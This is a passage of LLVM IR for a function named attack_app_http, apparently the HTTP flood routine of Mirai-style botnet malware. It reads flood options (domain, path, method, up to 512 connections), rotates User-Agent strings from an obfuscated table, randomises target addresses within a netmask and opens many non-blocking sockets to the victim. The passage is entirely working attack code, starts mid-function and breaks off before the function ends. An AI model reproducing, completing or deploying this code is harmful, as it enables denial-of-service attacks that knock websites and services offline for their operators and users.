  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @inet_addr(i8* %20) #6
  store i32 %21, i32* %5, align 4
  br label %22

; <label>:22:                                     ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 20, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 19, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 21, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 23, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %89, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i8*, i8** %17, align 8
  %88 = icmp eq i8* %87, null
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %86, %4
  br label %2445

; <label>:90:                                     ; preds = %86
  %91 = load i8*, i8** %17, align 8
  %92 = call i32 @util_strlen(i8* %91)
  %93 = icmp sgt i32 %92, 255
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %90
  br label %2445

; <label>:95:                                     ; preds = %90
  %96 = load i8*, i8** %16, align 8
  %97 = call i32 @util_strlen(i8* %96)
  %98 = icmp sgt i32 %97, 127
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %95
  br label %2445

; <label>:100:                                    ; preds = %95
  %101 = load i8*, i8** %15, align 8
  %102 = call i32 @util_strlen(i8* %101)
  %103 = icmp sgt i32 %102, 9
  br i1 %103, label %104, label %105

; <label>:104:                                    ; preds = %100
  br label %2445

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %10, align 4
  br label %106

; <label>:106:                                    ; preds = %137, %105
  %107 = load i32, i32* %10, align 4
  %108 = load i8*, i8** %15, align 8
  %109 = call i32 @util_strlen(i8* %108)
  %110 = icmp slt i32 %107, %109
  br i1 %110, label %111, label %140

; <label>:111:                                    ; preds = %106
  %112 = load i8*, i8** %15, align 8
  %113 = load i32, i32* %10, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i8, i8* %112, i64 %114
  %116 = load i8, i8* %115, align 1
  %117 = sext i8 %116 to i32
  %118 = icmp sge i32 %117, 97
  br i1 %118, label %119, label %136

; <label>:119:                                    ; preds = %111
  %120 = load i8*, i8** %15, align 8
  %121 = load i32, i32* %10, align 4
  %122 = sext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = load i8, i8* %123, align 1
  %125 = sext i8 %124 to i32
  %126 = icmp sle i32 %125, 122
  br i1 %126, label %127, label %136

; <label>:127:                                    ; preds = %119
  %128 = load i8*, i8** %15, align 8
  %129 = load i32, i32* %10, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8, i8* %128, i64 %130
  %132 = load i8, i8* %131, align 1
  %133 = sext i8 %132 to i32
  %134 = sub nsw i32 %133, 32
  %135 = trunc i32 %134 to i8
  store i8 %135, i8* %131, align 1
  br label %136

; <label>:136:                                    ; preds = %127, %119, %111
  br label %137

; <label>:137:                                    ; preds = %136
  %138 = load i32, i32* %10, align 4
  %139 = add nsw i32 %138, 1
  store i32 %139, i32* %10, align 4
  br label %106

; <label>:140:                                    ; preds = %106
  %141 = load i32, i32* %18, align 4
  %142 = icmp sgt i32 %141, 512
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %140
  store i32 512, i32* %18, align 4
  br label %144

; <label>:144:                                    ; preds = %143, %140
  call void @table_unlock_val(i8 zeroext 43)
  call void @table_unlock_val(i8 zeroext 44)
  call void @table_unlock_val(i8 zeroext 45)
  call void @table_unlock_val(i8 zeroext 46)
  call void @table_unlock_val(i8 zeroext 47)
  call void @table_unlock_val(i8 zeroext 48)
  call void @table_unlock_val(i8 zeroext 49)
  call void @table_unlock_val(i8 zeroext 50)
  call void @table_unlock_val(i8 zeroext 51)
  call void @table_unlock_val(i8 zeroext 52)
  call void @table_unlock_val(i8 zeroext 53)
  %145 = load i32, i32* %18, align 4
  %146 = sext i32 %145 to i64
  %147 = call noalias i8* @calloc(i64 %146, i64 3140) #6
  %148 = bitcast i8* %147 to %struct.attack_http_state*
  store %struct.attack_http_state* %148, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %149

; <label>:149:                                    ; preds = %346, %144
  %150 = load i32, i32* %9, align 4
  %151 = load i32, i32* %18, align 4
  %152 = icmp slt i32 %150, %151
  br i1 %152, label %153, label %349

; <label>:153:                                    ; preds = %149
  %154 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %155 = load i32, i32* %9, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %154, i64 %156
  %158 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %157, i32 0, i32 1
  store i8 0, i8* %158, align 4
  %159 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %159, i64 %161
  %163 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %162, i32 0, i32 0
  store i32 -1, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = load i8, i8* %5, align 1
  %167 = zext i8 %166 to i32
  %168 = srem i32 %165, %167
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %169
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %170, i32 0, i32 1
  %172 = load i32, i32* %171, align 4
  %173 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %176, i32 0, i32 4
  store i32 %172, i32* %177, align 4
  %178 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %178, i64 %180
  %182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %181, i32 0, i32 6
  %183 = getelementptr inbounds [257 x i8], [257 x i8]* %182, i32 0, i32 0
  %184 = load i8*, i8** %17, align 8
  %185 = call i32 @util_strcpy(i8* %183, i8* %184)
  %186 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %187 = load i32, i32* %9, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %186, i64 %188
  %190 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %189, i32 0, i32 6
  %191 = getelementptr inbounds [257 x i8], [257 x i8]* %190, i64 0, i64 0
  %192 = load i8, i8* %191, align 4
  %193 = sext i8 %192 to i32
  %194 = icmp ne i32 %193, 47
  br i1 %194, label %195, label %223

; <label>:195:                                    ; preds = %153
  %196 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %197 = load i32, i32* %9, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %199, i32 0, i32 6
  %201 = getelementptr inbounds [257 x i8], [257 x i8]* %200, i32 0, i32 0
  %202 = getelementptr inbounds i8, i8* %201, i64 1
  %203 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %204 = load i32, i32* %9, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %203, i64 %205
  %207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %206, i32 0, i32 6
  %208 = getelementptr inbounds [257 x i8], [257 x i8]* %207, i32 0, i32 0
  %209 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %212, i32 0, i32 6
  %214 = getelementptr inbounds [257 x i8], [257 x i8]* %213, i32 0, i32 0
  %215 = call i32 @util_strlen(i8* %214)
  %216 = sext i32 %215 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %202, i8* %208, i64 %216, i32 1, i1 false)
  %217 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %218 = load i32, i32* %9, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %220, i32 0, i32 6
  %222 = getelementptr inbounds [257 x i8], [257 x i8]* %221, i64 0, i64 0
  store i8 47, i8* %222, align 4
  br label %223

; <label>:223:                                    ; preds = %195, %153
  %224 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %225 = load i32, i32* %9, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %224, i64 %226
  %228 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %227, i32 0, i32 10
  %229 = getelementptr inbounds [9 x i8], [9 x i8]* %228, i32 0, i32 0
  %230 = load i8*, i8** %15, align 8
  %231 = call i32 @util_strcpy(i8* %229, i8* %230)
  %232 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %233 = load i32, i32* %9, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %235, i32 0, i32 9
  %237 = getelementptr inbounds [9 x i8], [9 x i8]* %236, i32 0, i32 0
  %238 = load i8*, i8** %15, align 8
  %239 = call i32 @util_strcpy(i8* %237, i8* %238)
  %240 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %241 = load i32, i32* %9, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %240, i64 %242
  %244 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %243, i32 0, i32 7
  %245 = getelementptr inbounds [129 x i8], [129 x i8]* %244, i32 0, i32 0
  %246 = load i8*, i8** %16, align 8
  %247 = call i32 @util_strcpy(i8* %245, i8* %246)
  %248 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %249 = load i32, i32* %9, align 4
  %250 = load i8, i8* %5, align 1
  %251 = zext i8 %250 to i32
  %252 = srem i32 %249, %251
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %248, i64 %253
  %255 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %254, i32 0, i32 2
  %256 = load i8, i8* %255, align 4
  %257 = zext i8 %256 to i32
  %258 = icmp slt i32 %257, 32
  br i1 %258, label %259, label %289

; <label>:259:                                    ; preds = %223
  %260 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %261 = load i32, i32* %9, align 4
  %262 = load i8, i8* %5, align 1
  %263 = zext i8 %262 to i32
  %264 = srem i32 %261, %263
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %260, i64 %265
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %266, i32 0, i32 1
  %268 = load i32, i32* %267, align 4
  %269 = call i32 @ntohl(i32 %268) #7
  %270 = call i32 @rand_next()
  %271 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %272 = load i32, i32* %9, align 4
  %273 = load i8, i8* %5, align 1
  %274 = zext i8 %273 to i32
  %275 = srem i32 %272, %274
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %271, i64 %276
  %278 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %277, i32 0, i32 2
  %279 = load i8, i8* %278, align 4
  %280 = zext i8 %279 to i32
  %281 = lshr i32 %270, %280
  %282 = add i32 %269, %281
  %283 = call i32 @htonl(i32 %282) #7
  %284 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %285 = load i32, i32* %9, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %284, i64 %286
  %288 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %287, i32 0, i32 4
  store i32 %283, i32* %288, align 4
  br label %289

; <label>:289:                                    ; preds = %259, %223
  %290 = call i32 @rand_next()
  %291 = urem i32 %290, 5
  switch i32 %291, label %337 [
    i32 0, label %292
    i32 1, label %301
    i32 2, label %310
    i32 3, label %319
    i32 4, label %328
  ]

; <label>:292:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 54)
  %293 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %294 = load i32, i32* %9, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %293, i64 %295
  %297 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %296, i32 0, i32 5
  %298 = getelementptr inbounds [512 x i8], [512 x i8]* %297, i32 0, i32 0
  %299 = call i8* @table_retrieve_val(i32 54, i32* null)
  %300 = call i32 @util_strcpy(i8* %298, i8* %299)
  call void @table_lock_val(i8 zeroext 54)
  br label %337

; <label>:301:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 55)
  %302 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %302, i64 %304
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %305, i32 0, i32 5
  %307 = getelementptr inbounds [512 x i8], [512 x i8]* %306, i32 0, i32 0
  %308 = call i8* @table_retrieve_val(i32 55, i32* null)
  %309 = call i32 @util_strcpy(i8* %307, i8* %308)
  call void @table_lock_val(i8 zeroext 55)
  br label %337

; <label>:310:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 56)
  %311 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %312 = load i32, i32* %9, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %311, i64 %313
  %315 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %314, i32 0, i32 5
  %316 = getelementptr inbounds [512 x i8], [512 x i8]* %315, i32 0, i32 0
  %317 = call i8* @table_retrieve_val(i32 56, i32* null)
  %318 = call i32 @util_strcpy(i8* %316, i8* %317)
  call void @table_lock_val(i8 zeroext 56)
  br label %337

; <label>:319:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 57)
  %320 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %323, i32 0, i32 5
  %325 = getelementptr inbounds [512 x i8], [512 x i8]* %324, i32 0, i32 0
  %326 = call i8* @table_retrieve_val(i32 57, i32* null)
  %327 = call i32 @util_strcpy(i8* %325, i8* %326)
  call void @table_lock_val(i8 zeroext 57)
  br label %337

; <label>:328:                                    ; preds = %289
  call void @table_unlock_val(i8 zeroext 58)
  %329 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %329, i64 %331
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %332, i32 0, i32 5
  %334 = getelementptr inbounds [512 x i8], [512 x i8]* %333, i32 0, i32 0
  %335 = call i8* @table_retrieve_val(i32 58, i32* null)
  %336 = call i32 @util_strcpy(i8* %334, i8* %335)
  call void @table_lock_val(i8 zeroext 58)
  br label %337

; <label>:337:                                    ; preds = %328, %319, %310, %301, %292, %289
  %338 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %339 = load i32, i32* %9, align 4
  %340 = sext i32 %339 to i64
  %341 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %338, i64 %340
  %342 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %341, i32 0, i32 6
  %343 = getelementptr inbounds [257 x i8], [257 x i8]* %342, i32 0, i32 0
  %344 = load i8*, i8** %17, align 8
  %345 = call i32 @util_strcpy(i8* %343, i8* %344)
  br label %346

; <label>:346:                                    ; preds = %337
  %347 = load i32, i32* %9, align 4
  %348 = add nsw i32 %347, 1
  store i32 %348, i32* %9, align 4
  br label %149

; <label>:349:                                    ; preds = %149
  br label %350

; <label>:350:                                    ; preds = %2444, %960, %950, %349
  store i32 0, i32* %23, align 4
  %351 = call i64 @time(i64* null) #6
  %352 = trunc i64 %351 to i32
  store i32 %352, i32* %27, align 4
  br label %353

; <label>:353:                                    ; preds = %350
  %354 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %355 = getelementptr inbounds [16 x i64], [16 x i64]* %354, i64 0, i64 0
  %356 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %355) #6, !srcloc !1
  %357 = extractvalue { i64, i64* } %356, 0
  %358 = extractvalue { i64, i64* } %356, 1
  %359 = trunc i64 %357 to i32
  store i32 %359, i32* %28, align 4
  %360 = ptrtoint i64* %358 to i64
  %361 = trunc i64 %360 to i32
  store i32 %361, i32* %29, align 4
  br label %362

; <label>:362:                                    ; preds = %353
  br label %363

; <label>:363:                                    ; preds = %362
  %364 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %365 = getelementptr inbounds [16 x i64], [16 x i64]* %364, i64 0, i64 0
  %366 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %365) #6, !srcloc !2
  %367 = extractvalue { i64, i64* } %366, 0
  %368 = extractvalue { i64, i64* } %366, 1
  %369 = trunc i64 %367 to i32
  store i32 %369, i32* %30, align 4
  %370 = ptrtoint i64* %368 to i64
  %371 = trunc i64 %370 to i32
  store i32 %371, i32* %31, align 4
  br label %372

; <label>:372:                                    ; preds = %363
  store i32 0, i32* %9, align 4
  br label %373

; <label>:373:                                    ; preds = %944, %372
  %374 = load i32, i32* %9, align 4
  %375 = load i32, i32* %18, align 4
  %376 = icmp slt i32 %374, %375
  br i1 %376, label %377, label %947

; <label>:377:                                    ; preds = %373
  %378 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %379 = load i32, i32* %9, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %378, i64 %380
  store %struct.attack_http_state* %381, %struct.attack_http_state** %26, align 8
  %382 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %383 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %382, i32 0, i32 1
  %384 = load i8, i8* %383, align 4
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 1
  br i1 %386, label %387, label %399

; <label>:387:                                    ; preds = %377
  %388 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %389 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %388, i32 0, i32 12
  %390 = load i32, i32* %389, align 4
  %391 = icmp ne i32 %390, 0
  br i1 %391, label %392, label %395

; <label>:392:                                    ; preds = %387
  %393 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %394 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %393, i32 0, i32 1
  store i8 4, i8* %394, align 4
  br label %398

; <label>:395:                                    ; preds = %387
  %396 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %397 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %396, i32 0, i32 1
  store i8 0, i8* %397, align 4
  br label %398

; <label>:398:                                    ; preds = %395, %392
  br label %399

; <label>:399:                                    ; preds = %398, %377
  %400 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %401 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %400, i32 0, i32 1
  %402 = load i8, i8* %401, align 4
  %403 = zext i8 %402 to i32
  %404 = icmp eq i32 %403, 0
  br i1 %404, label %405, label %485

; <label>:405:                                    ; preds = %399
  %406 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %406, i8 0, i64 16, i32 4, i1 false)
  %407 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %408 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %407, i32 0, i32 0
  %409 = load i32, i32* %408, align 4
  %410 = icmp ne i32 %409, -1
  br i1 %410, label %411, label %416

; <label>:411:                                    ; preds = %405
  %412 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %413 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %412, i32 0, i32 0
  %414 = load i32, i32* %413, align 4
  %415 = call i32 @close(i32 %414)
  br label %416

; <label>:416:                                    ; preds = %411, %405
  %417 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %418 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %419 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %418, i32 0, i32 0
  store i32 %417, i32* %419, align 4
  %420 = icmp eq i32 %417, -1
  br i1 %420, label %421, label %422

; <label>:421:                                    ; preds = %416
  br label %944

; <label>:422:                                    ; preds = %416
  %423 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %424 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %423, i32 0, i32 0
  %425 = load i32, i32* %424, align 4
  %426 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %427 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 4
  %429 = call i32 (i32, i32, ...) @fcntl(i32 %428, i32 3, i32 0)
  %430 = or i32 2048, %429
  %431 = call i32 (i32, i32, ...) @fcntl(i32 %425, i32 4, i32 %430)
  store i32 65535, i32* %10, align 4
  %432 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %433 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 4
  %435 = bitcast i32* %10 to i8*
  %436 = call i32 @setsockopt(i32 %434, i32 0, i32 8, i8* %435, i32 4) #6
  %437 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %437, align 4
  %438 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %439 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %438, i32 0, i32 4
  %440 = load i32, i32* %439, align 4
  %441 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %442 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %441, i32 0, i32 0
  store i32 %440, i32* %442, align 4
  %443 = load i16, i16* %19, align 2
  %444 = call zeroext i16 @htons(i16 zeroext %443) #7
  %445 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %444, i16* %445, align 2
  %446 = load i32, i32* %27, align 4
  %447 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %448 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %447, i32 0, i32 2
  store i32 %446, i32* %448, align 4
  %449 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %449, i32 0, i32 1
  store i8 2, i8* %450, align 4
  %451 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %452 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %451, i32 0, i32 0
  %453 = load i32, i32* %452, align 4
  %454 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %455 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %455, %struct.sockaddr** %454, align 8
  %456 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %457 = load %struct.sockaddr*, %struct.sockaddr** %456, align 8
  %458 = call i32 @connect(i32 %453, %struct.sockaddr* %457, i32 16)
  %459 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %460 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %459, i32 0, i32 0
  %461 = load i32, i32* %460, align 4
  %462 = srem i32 %461, 64
  %463 = zext i32 %462 to i64
  %464 = shl i64 1, %463
  %465 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %466 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %466, i32 0, i32 0
  %468 = load i32, i32* %467, align 4
  %469 = sdiv i32 %468, 64
  %470 = sext i32 %469 to i64
